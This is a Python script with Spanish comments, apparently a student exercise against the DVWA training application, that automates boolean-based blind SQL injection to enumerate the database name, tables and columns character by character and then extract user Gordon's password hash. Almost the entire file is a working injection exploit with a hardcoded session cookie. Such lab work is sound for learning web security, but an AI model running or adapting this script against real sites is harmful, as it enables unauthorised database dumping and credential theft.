import requests

server = "http://10.0.7.24/dvwa" #  servidor
#TODO Cambiarla cada vez que se entre a hacer la practica, ya que va cambiando
cookie = "cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE3MzE1MTU5ODIsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHA6Ly8xMC4wLjcuMjQvZHZ3YS92dWxuZXJhYmlsaXRpZXMvZmkvP3BhZ2U9SFRUUDovLzEwLjAuNy40In0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNzMxNTE2MDk4LCJ2YWx1ZSI6IiIsImZpcnN0X3BhZ2UiOiJodHRwOi8vMTAuMC43LjI0L2R2d2EvdnVsbmVyYWJpbGl0aWVzL2ZpLz9wYWdlPUhUVFA6Ly8xMC4wLjcuNCJ9fQ==; _shopify_y=26653da9-6810-44BF-7B5D-70E76AD0475D; _ama=1964009468.1731515987; _pandectes_gdpr=eyJjb3VudHJ5Ijp7ImNvZGUiOiJFUyIsInN0YXRlIjoiQU4iLCJkZXRlY3RlZCI6MTczMTUxNTk4Nn0sInN0YXR1cyI6ImFsbG93IiwidGltZXN0YW1wIjoxNzMxNTE1OTk3LCJwcmVmZXJlbmNlcyI6MCwiaWQiOiI2NzM0ZDY2MDI1MGRmNDAzMzVjYmZiOWQifQ==; _ga_7BNZCH65T7=GS1.1.1731515987.1.1.1731516052.60.0.1683298024; _ga=GA1.1.1964009468.1731515987; _gcl_au=1.1.1292286527.1731515998; language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=namybj29LKw0eRU7u3T3H9iQSQVuqncxJU6YSODFNafy6t49ANJW3qkDrgeR; security=low; PHPSESSID=fm3mr19qnla32dc8kag8h0j4dr"










response = requests.get(url=server+"vulnerabilities/sqli_blind/" , headers={"Cookie":cookie})

print("Status:",response.status_code) #Devuelve el estado de la peticion 200 403 404....
print("\nCabeceras\n ----------------------")
print (response.headers)
print("\n ----------------------")
print("\n Contenido\n ---------------------")
print(response.text)


# Obtener longitud del nombre de la base de datos
# 1' and length(database())=1 -- -

for longitud in range(0,20):
    inyection = f"1' and length(database())={longitud} -- -"
    response = requests.get(url=server+f"/vulnerabilities/sqli_blind/?id={inyection}&Submit=Submit#" , headers={"Cookie":cookie})
    ##print(response.request.path_url)
    if "User ID exists in the database" in response.text:
        break
print(f"El nombre de la BD tiene {longitud} letras")

    





# Obtener el nombre de la base de datos
# 2' and ascii(substr(database(),1,1))=48 -- 
# A-Z → 65 a 90, a – z → 97 a 122, 0 – 9 → 48 a 57
longitud_bd=longitud
nombre_bd=""
for posicion in range(1, longitud_bd+1):
    for ascii in range(48,123):
        inyection = f" 2' and ascii(substr(database(),{posicion},1))={ascii} -- - "
        #print(inyection)
        response = requests.get(url=server+f"/vulnerabilities/sqli_blind/?id={inyection}&Submit=Submit#" , headers={"Cookie":cookie})
        if "User ID exists in the database" in response.text:
            nombre_bd += chr(ascii)
            break
print("El nombre de la BD es" , {nombre_bd})



# Obtener número de tablas de la base de datos
# 2' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=1 -- 
nombreBase = nombre_bd
for numTablas in range(0,40):
    inyection = f"2' and (select count(table_name) from information_schema.tables where table_schema='{nombreBase}')={numTablas} -- -"
    response = requests.get(url=server+f"/vulnerabilities/sqli_blind/?id={inyection}&Submit=Submit#" , headers={"Cookie":cookie})
    if "User ID exists in the database" in response.text:
        break
print("El numero de tablas es" , numTablas)





# de cada tabla obtengo:
# número de caracteres
# nombre
# "1' and (SELECT length(table_name) FROM information_schema.tables WHERE table_schema='dvwa' LIMIT 1 OFFSET 1)=1 -- -"

#* Para sacar el numero de caracteres que tiene cada una de las tablas.
#? Tenemos que hacer un array, para almacenar las longitudes de cada tabla.
almcanajeLongitudTablas = []
longitudMaxima = 0 #? Para el sigueinte ejercicio 
for tablaIndex in range(numTablas): 
    for longitud in range(1, 21):  
        inyection = f"1' and (SELECT length(table_name) FROM information_schema.tables WHERE table_schema='{nombreBase}' LIMIT 1 OFFSET {tablaIndex})={longitud} -- -"
        response = requests.get(url=server + f"/vulnerabilities/sqli_blind/?id={inyection}&Submit=Submit#", headers={"Cookie": cookie})
        if "User ID exists in the database" in response.text:
            almcanajeLongitudTablas.append((tablaIndex + 1, longitud))
            if longitud > longitudMaxima:
                longitudMaxima = longitud #todo Actualizamos la variable con la longitud mas grande
            break
         
    #print(almcanajeLongitudTablas)
    print(f"La tabla {tablaIndex + 1} tiene {longitud} caracteres")

#print("La longitud mas grande ha sido de " , longitudMaxima)
    
    


#for numTablas in range(0,numTablas):
   # for longitud in range(0,20):
       # inyection = f"1' and (SELECT length(table_name) FROM information_schema.tables WHERE table_schema='{nombreBase}' LIMIT 1 OFFSET {numTablas})={longitud} -- -"
        #response = requests.get(url=server+f"/vulnerabilities/sqli_blind/?id={inyection}&Submit=Submit#" , headers={"Cookie":cookie})
       # if "User ID exists in the database" in response.text:
            #break#
#print("La tabla", numTablas , "tiene " , longitud , " caracteres")





    # Nombre de la tabla
    #* Para este caso, tengo que hacer un for, que vaya incrementando el segundo valor del substr, osea el valor de posicionamiento para ir sacando caracter por caracter el codigo ascii el nombre de las tablas. Ejemplo: 
    #? table_name,1,1 --> 103 = g 
    #? table_name ,2,1 --> 117 = u
    # select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema='dvwa' LIMIT 1 OFFSET 0;
nombreTablas = [] #* Para el sigueinte ejercicio almaceno el nombre de las tablas
for tablaIndex in range(numTablas):
    nombreTabla = ""
    for posicion in range(1, longitudMaxima + 1):  #? Iteramos desde 1 hasta la longitud máxima
        for ascii in range(32, 126):  #? Caracteres ASCII imprimibles desde el espacio hasta ~ https://elcodigoascii.com.ar/codigos-ascii/letra-u-minuscula-codigo-ascii-117.html
            inyection = f"1' and (SELECT ascii(substr(table_name, {posicion}, 1)) FROM information_schema.tables WHERE table_schema='{nombreBase}' LIMIT 1 OFFSET {tablaIndex})={ascii} -- -"
            response = requests.get(url=server + f"/vulnerabilities/sqli_blind/?id={inyection}&Submit=Submit#", headers={"Cookie": cookie})
            if "User ID exists in the database" in response.text:
                nombreTabla += chr(ascii)  # Convertimos el valor ASCII a carácter
                break
    nombreTablas.append(nombreTabla)
            
    print(f"El nombre de la tabla {tablaIndex + 1} es: {nombreTabla}")
#print(nombreTablas)
    
 
   

    

    # De cada tabla necesito: 1) número de columnas, 2) número de letras de cada columna, 3) nombre de cada columna.
    # 1) número de columnas:
    # select count(column_name) from information_schema.columns where table_schema='dvwa' and table_name='guestbook';
    # Lista para almacenar el número de columnas por tabla
columnasPorTabla = []
# Iterar sobre cada tabla conocida
for nombreTabla in nombreTablas: #? Usamos la lista nombreTablas del ejercicio anterior que almacenaba la tablas [guestbook , users ]
    for numColumnas in range(1,50): 
        inyection = f"1' and (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema='{nombreBase}' AND table_name='{nombreTabla}')={numColumnas} -- -"
        response = requests.get(url=server + f"/vulnerabilities/sqli_blind/?id={inyection}&Submit=Submit#", headers={"Cookie": cookie})
        if "User ID exists in the database" in response.text:
            columnasPorTabla.append((nombreTabla, numColumnas))  #? Guardamos el nombre de la tabla y el numero de columnas
            print(f"La tabla '{nombreTabla}' tiene {numColumnas} columnas.")
            break  

    
    # 2) Número de letras de cada columna
    # select length(column_name) from information_schema.columns where table_name='users' and table_schema='dvwa' LIMIT 1 OFFSET 0;
    
    longitudColumnasPorTabla = []  # Lista para almacenar el número de letras por columna

print("\nProcesando el número de letras por columna...")
for nombreTabla, numColumnas in columnasPorTabla:  # Usamos la información de columnas por tabla
    print(f"\nProcesando la tabla: {nombreTabla}")
    for columnaIndex in range(numColumnas):  #? Itero sobre el indice de las columnas
        for longitud in range(1, 51):  
            inyection = f"1' and (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema='{nombreBase}' AND table_name='{nombreTabla}' LIMIT 1 OFFSET {columnaIndex})={longitud} -- -"
            response = requests.get(url=server + f"/vulnerabilities/sqli_blind/?id={inyection}&Submit=Submit#", headers={"Cookie": cookie})
            if "User ID exists in the database" in response.text:
                longitudColumnasPorTabla.append((nombreTabla, columnaIndex + 1, longitud))  # Guardar resultado
                print(f"La columna {columnaIndex + 1} de la tabla '{nombreTabla}' tiene {longitud} letras.")
                break  


        # 3) nombre de cada columna
        # select ascii(substr(column_name,1,1)) from information_schema.columns where table_name='users' and table_schema='dvwa' LIMIT 1 OFFSET 0;
     # Lista para almacenar los nombres de las columnas por tabla
nombresColumnasPorTabla = []

print("\nProcesando el nombre de cada columna...")

for nombreTabla, columnaIndex, longitud in longitudColumnasPorTabla:  # Usamos la longitud conocida de cada columna
    print(f"Procesando la columna {columnaIndex} de la tabla '{nombreTabla}' (longitud: {longitud})")
    nombreColumna = ""  # Inicializamos el nombre de la columna
    for posicion in range(1, longitud + 1):  # Usamos la longitud exacta conocida
        for ascii in range(32, 126):  # Caracteres imprimibles ASCII
            inyection = f"1' and (SELECT ascii(substr(column_name, {posicion}, 1)) FROM information_schema.columns WHERE table_schema='{nombreBase}' AND table_name='{nombreTabla}' LIMIT 1 OFFSET {columnaIndex - 1})={ascii} -- -"
            response = requests.get(url=server + f"/vulnerabilities/sqli_blind/?id={inyection}&Submit=Submit#", headers={"Cookie": cookie})
            #todo No entiendo esto Validar si el carácter es correcto
            if "User ID exists in the database" in response.text:
                nombreColumna += chr(ascii)  # Añadimos el carácter al nombre de la columna

    if nombreColumna:  # Si encontramos un nombre completo, lo almacenamos
        nombresColumnasPorTabla.append((nombreTabla, columnaIndex, nombreColumna))
        #print("hola" , nombresColumnasPorTabla)
        print(f"La Columna {columnaIndex} de la tabla '{nombreTabla}' es: {nombreColumna}")


print("\nResultado final: Nombres de las columnas por tabla")
for nombreTabla, columnaIndex, nombreColumna in nombresColumnasPorTabla:
    print(f"Tabla: {nombreTabla}, Columna {columnaIndex}: {nombreColumna}")
    
    
    
    
    #todo Ejercicio 5 Credenciales del usuario Gordon
    
    #1) Comprobar que exista el usuario Gordon en la tabla de users
    #? Comprobar que exista al menos un usuario que se llame Gordon en la tabla
    # select count(*) from users where first_name = 'Gordon'; Deberia de dar como resultado solamente 1 usuario con ese nombre
    inyection = f"1' and (SELECT COUNT(*) FROM users WHERE first_name='Gordon')=1 -- -"
    response = requests.get(url=server + f"/vulnerabilities/sqli_blind/?id={inyection}&Submit=Submit#", headers={"Cookie": cookie})

if "User ID exists in the database" in response.text:
    print("El usuario 'Gordon' existe en la base de datos.")
else:
    print("El usuario 'Gordon' no existe o hubo un error en la consulta.")
    
    #todo 2) Obtener la lontitud del hash de la contraseña, para luego ir haciendo el substr caracter por caracter.
    # select length(password) from users where first_name='Gordon') Deberia de dar como resultado 32 caracteres
longitudHashPass = 0
for longitudHash in range(1,100): #? Suponemos que el hash no superara la longitud de 100 caracteres
    inyection = f"1' and (SELECT LENGTH(password) FROM users WHERE first_name='Gordon')={longitudHash} -- -"
    response = requests.get(url=server + f"/vulnerabilities/sqli_blind/?id={inyection}&Submit=Submit#", headers={"Cookie": cookie})
    
    if "User ID exists in the database" in response.text:
        longitudHashPass = longitudHash
        print(f"La longitud del hash de la contraseña del usuario 'Gordon' es: {longitudHashPass} caracteres.")
        break
    
    #todo 3) Mostrar el hash de la contraseña
    #select substr(password,1,32) from users where first_name = 'Gordon'; Deberia de dar como resultado "e99a18c428cb38d5f260853678922e03"
hashContraseña = ""
for posicion in range(1, longitudHashPass + 1):
    for ascii in range(32,126): #? Caracteres imprimibles ASCII https://elcodigoascii.com.ar/codigos-ascii/letra-u-minuscula-codigo-ascii-117.html
        inyection = f"1' and ascii(substr((SELECT password FROM users WHERE first_name='Gordon'), {posicion}, 1))={ascii} -- -"
        response = requests.get(url=server + f"/vulnerabilities/sqli_blind/?id={inyection}&Submit=Submit#", headers={"Cookie": cookie})
        if "User ID exists in the database" in response.text:
                hashContraseña += chr(ascii)  # Convertimos el valor ASCII en un carácter y lo añadimos al hash
                #print(f"Carácter {posicion}: {chr(ascii)}")
                break

print(f"\nEl hash de la contraseña del usuario 'Gordon' es: {hashContraseña}")
    
    
